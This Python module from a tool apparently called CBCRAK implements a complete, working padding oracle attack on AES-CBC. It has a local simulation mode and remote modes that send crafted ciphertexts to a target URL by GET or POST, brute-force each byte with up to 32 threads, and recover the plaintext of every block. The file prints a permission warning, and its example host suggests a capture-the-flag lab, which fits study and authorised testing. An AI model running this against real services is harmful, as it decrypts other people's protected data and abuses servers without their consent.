#!/usr/bin/env python3
"""
CBCRAK - oracle.py
Padding Oracle Attack — local simulation and remote URL modes.
Supports GET/POST, single-threaded and multi-threaded brute force.
"""

import time
import threading
import requests
from binascii import hexlify, unhexlify
from colorama import Fore, Style

from utils.banner import print_header, info, success, error, warning, result, print_divider
from utils.helpers import (get_input, get_hex_input, get_url, get_choice,
                            to_hex, xor_bytes, is_valid_padding,
                            split_blocks, BLOCK_SIZE, press_enter)
from utils.display import (brute_force_bar, print_oracle_progress,
                            print_recovered_block, print_key_value_box)

from modules.encrypt import aes_cbc_encrypt


# ============================================================
# ЛОКАЛЬНОЕ ОРАКУЛ
# ============================================================

def local_oracle(iv: bytes, ciphertext: bytes, key: bytes) -> bool:
    from Crypto.Cipher import AES
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = cipher.decrypt(ciphertext)
    return is_valid_padding(decrypted)


# ============================================================
# УДАЛЕННОЕ ОРАКУЛ — GET
# ============================================================

def remote_oracle_get(base_url: str, modified_iv: bytes,
                      ciphertext: bytes, valid_code: int = 200) -> bool:
    try:
        payload = hexlify(modified_iv + ciphertext).decode()
        sep = "" if base_url.endswith("=") else "="
        url = f"{base_url}{sep}{payload}"
        response = requests.get(url, timeout=10)
        return response.status_code == valid_code
    except requests.RequestException:
        return False


# ============================================================
# УДАЛЕННОЕ ОРАКУЛ — POST
# ============================================================

def remote_oracle_post(url: str, param: str, modified_iv: bytes,
                       ciphertext: bytes, valid_code: int = 200) -> bool:
    try:
        payload = hexlify(modified_iv + ciphertext).decode()
        response = requests.post(url, data={param: payload}, timeout=10)
        return response.status_code == valid_code
    except requests.RequestException:
        return False


# ============================================================
# ОДНОПОТОЧНЫЙ ПЕРЕБОР
# ============================================================

def brute_single(byte_index: int, padding_val: int, modified_iv: bytearray,
                 ciphertext: bytes, oracle_fn) -> int:
    """
    Tries byte values 0-255 one at a time.
    Returns the winning byte value or -1 if not found.
    """
    bar = brute_force_bar(
        256, desc=f"Byte {BLOCK_SIZE - byte_index:>2}/{BLOCK_SIZE} "
                  f"[single] (padding=0x{padding_val:02x})"
    )
    for byte_val in range(256):
        test_iv = bytearray(modified_iv)
        test_iv[byte_index] = byte_val
        bar.update(1)
        if oracle_fn(bytes(test_iv), ciphertext):
            bar.close()
            return byte_val
    bar.close()
    return -1


# ============================================================
# МНОГОПОТОЧНЫЙ ПЕРЕБОР
# ============================================================

def brute_threaded(byte_index: int, padding_val: int, modified_iv: bytearray,
                   ciphertext: bytes, oracle_fn, threads: int = 16) -> int:
    """
    Splits 0-255 across N threads, each testing a chunk in parallel.
    Returns the winning byte value or -1 if not found.
    First valid result wins — all other threads stop.
    """
    result_holder = [-1]
    stop_event    = threading.Event()
    lock          = threading.Lock()

    chunks = [range(i, 256, threads) for i in range(threads)]

    bar = brute_force_bar(
        256, desc=f"Byte {BLOCK_SIZE - byte_index:>2}/{BLOCK_SIZE} "
                  f"[{threads}t] (padding=0x{padding_val:02x})"
    )
    bar_lock = threading.Lock()

    def worker(byte_range):
        for byte_val in byte_range:
            if stop_event.is_set():
                return
            test_iv = bytearray(modified_iv)
            test_iv[byte_index] = byte_val
            with bar_lock:
                bar.update(1)
            if oracle_fn(bytes(test_iv), ciphertext):
                with lock:
                    if result_holder[0] == -1:
                        result_holder[0] = byte_val
                stop_event.set()
                return

    thread_list = [threading.Thread(target=worker, args=(chunk,), daemon=True)
                   for chunk in chunks]

    for t in thread_list:
        t.start()
    for t in thread_list:
        t.join()

    bar.close()
    return result_holder[0]


# ============================================================
# ОСНОВНАЯ АТАКА — ОДИН БЛОК
# ============================================================

def padding_oracle_attack(iv: bytes, ciphertext: bytes, oracle_fn,
                          verbose: bool = False, threads: int = 1) -> bytes:
    """
    Performs padding oracle attack on a single 16-byte ciphertext block.

    Args:
        iv         : previous ciphertext block or IV (16 bytes)
        ciphertext : one 16-byte block to crack
        oracle_fn  : callable(modified_iv, ciphertext) -> bool
        verbose    : unused, kept for compatibility
        threads    : 1 = single threaded, >1 = threaded

    Returns:
        Recovered plaintext bytes (padding intact)
    """
    intermediate = [0] * BLOCK_SIZE
    plaintext    = [0] * BLOCK_SIZE

    info(f"Target ciphertext  : {to_hex(ciphertext)}")
    info(f"Using IV/prev block: {to_hex(iv)}")
    if threads > 1:
        info(f"Threading          : {threads} threads")
    print_divider()

    for byte_index in reversed(range(BLOCK_SIZE)):
        padding_val = BLOCK_SIZE - byte_index

        # Исправляет уже известные байты для получения правильного padding
        modified_iv = bytearray(BLOCK_SIZE)
        for k in range(byte_index + 1, BLOCK_SIZE):
            modified_iv[k] = intermediate[k] ^ padding_val

        # Перебор
        if threads > 1:
            found_val = brute_threaded(byte_index, padding_val,
                                       modified_iv, ciphertext,
                                       oracle_fn, threads)
        else:
            found_val = brute_single(byte_index, padding_val,
                                     modified_iv, ciphertext, oracle_fn)

        if found_val == -1:
            error(f"No valid padding found for byte {byte_index}. "
                  f"Oracle may be unreliable or valid_code is wrong.")
            continue

        inter_byte = found_val ^ padding_val
        pt_byte    = inter_byte ^ iv[byte_index]

        intermediate[byte_index] = inter_byte
        plaintext[byte_index]    = pt_byte

        print_oracle_progress(
            byte_index=byte_index,
            found_value=found_val,
            intermediate=inter_byte,
            plaintext_byte=pt_byte,
            total=BLOCK_SIZE
        )

        # Показать пока восстановленный открытый текст
        recovered_so_far = "".join(
            chr(plaintext[i]) if 32 <= plaintext[i] <= 126 else "."
            for i in range(byte_index, BLOCK_SIZE)
        )
        info(f"Plaintext so far   : ...{recovered_so_far}")

    return bytes(plaintext)


# ============================================================
# АТАКА НА МНОЖЕСТВЕННЫЕ БЛОКИ
# ============================================================

def attack_all_blocks(iv: bytes, ciphertext: bytes, oracle_fn,
                      verbose: bool = False, threads: int = 1) -> bytes:
    blocks    = split_blocks(ciphertext)
    recovered = b""

    info(f"Total blocks to crack: {len(blocks)}")

    for i, block in enumerate(blocks):
        print_header(f"ATTACKING BLOCK {i+1} of {len(blocks)}")
        block_iv = iv if i == 0 else blocks[i - 1]
        raw = padding_oracle_attack(block_iv, block, oracle_fn, verbose, threads)
        print_recovered_block(list(raw), label=f"Block {i+1} raw")
        recovered += raw

    return recovered


# ============================================================
# ИНТЕРАКТИВНОЕ МЕНЮ
# ============================================================

def run():
    print_header("PADDING ORACLE ATTACK")

    warning("Only use against systems you own or have permission to test.")
    print_divider()

    # --- Режим ---
    info("Select oracle mode:")
    mode = get_choice([
        "Local simulation (provide key — demo/learning)",
        "Remote URL — GET request  (e.g. /decrypt?ciphertext=<hex>)",
        "Remote URL — POST request (sends hex in form field)",
    ], "Choose mode")

    # --- IV + Шифротекст ---
    info("Tip: if server gives IV+CT concatenated, split at byte 16 (32 hex chars)")
    iv         = get_hex_input("IV (hex, 16 bytes = 32 hex chars)")
    ciphertext = get_hex_input("Ciphertext (hex, multiple of 16 bytes)")

    if len(iv) != BLOCK_SIZE:
        error(f"IV must be 16 bytes. Got {len(iv)}.")
        press_enter()
        return

    if len(ciphertext) % BLOCK_SIZE != 0:
        error(f"Ciphertext must be multiple of 16 bytes. Got {len(ciphertext)}.")
        press_enter()
        return

    # --- Потоки ---
    info("Threading options:")
    thread_choice = get_choice([
        "Single threaded (safe, slower)",
        "4  threads  (faster)",
        "8  threads  (recommended for remote targets)",
        "16 threads  (fast — watch out for rate limiting)",
        "32 threads  (aggressive)",
    ], "Choose threading mode")

    thread_map = {
        "Single": 1,
        "4 ":     4,
        "8 ":     8,
        "16":     16,
        "32":     32,
    }
    threads = 1
    if   "4 " in thread_choice or thread_choice.startswith("4"):  threads = 4
    elif "8 " in thread_choice or thread_choice.startswith("8"):  threads = 8
    elif "16" in thread_choice:                                    threads = 16
    elif "32" in thread_choice:                                    threads = 32

    info(f"Using {threads} thread{'s' if threads > 1 else ''}.")

    # --- Подробный вывод ---
    verbose = get_input("Verbose output? (y/n)", allow_empty=True).lower() == "y"

    # --- Настройка оракула ---
    if mode.startswith("Local"):
        from utils.helpers import get_key
        warning("Local mode: key required to simulate the oracle.")
        key = get_key()
        oracle_fn = lambda mod_iv, ct: local_oracle(mod_iv, ct, key)
        info("Local oracle ready.")

    elif "GET" in mode:
        info("GET mode — hex payload appended to URL")
        base_url   = get_input("Enter URL up to and including '=' "
                               "(e.g. http://padding.thm:5002/decrypt?ciphertext=)")
        valid_code = int(get_input("HTTP status code for VALID padding", allow_empty=True) or "200")
        oracle_fn  = lambda mod_iv, ct: remote_oracle_get(base_url, mod_iv, ct, valid_code)
        info(f"GET oracle ready. Valid = HTTP {valid_code}")

    else:
        url        = get_url("Enter target URL")
        param      = get_input("Form field name (e.g. ciphertext)")
        valid_code = int(get_input("HTTP status code for VALID padding", allow_empty=True) or "200")
        oracle_fn  = lambda mod_iv, ct: remote_oracle_post(url, param, mod_iv, ct, valid_code)
        info(f"POST oracle ready. Valid = HTTP {valid_code}")

    # --- Сводка ---
    print_header("ATTACK PARAMETERS")
    print_key_value_box({
        "Mode"        : mode,
        "IV (hex)"    : to_hex(iv),
        "Ciphertext"  : to_hex(ciphertext),
        "Block count" : str(len(ciphertext) // BLOCK_SIZE),
        "Threads"     : str(threads),
        "Verbose"     : str(verbose),
    })

    confirm = get_input("Launch attack? (y/n)", allow_empty=True)
    if confirm.lower() != "y":
        warning("Attack cancelled.")
        press_enter()
        return

    # --- Запуск ---
    print_header("ATTACK IN PROGRESS")
    start_time = time.time()

    raw_plaintext = attack_all_blocks(iv, ciphertext, oracle_fn, verbose, threads)
    elapsed = time.time() - start_time

    # --- Удаление padding ---
    try:
        from utils.helpers import pkcs7_unpad
        plaintext = pkcs7_unpad(raw_plaintext)
    except ValueError:
        warning("Could not strip padding — showing raw bytes.")
        plaintext = raw_plaintext

    # --- Результаты ---
    print_header("ATTACK COMPLETE")
    print_key_value_box({
        "Time taken"      : f"{elapsed:.2f} seconds",
        "Raw (hex)"       : to_hex(raw_plaintext),
        "Plaintext (hex)" : to_hex(plaintext),
        "Plaintext"       : plaintext.decode(errors="replace"),
    })

    print(f"\n  {Fore.GREEN}{Style.BRIGHT}Recovered: {plaintext.decode(errors='replace')}{Style.RESET_ALL}\n")

    success("Padding oracle attack complete!")
    press_enter()
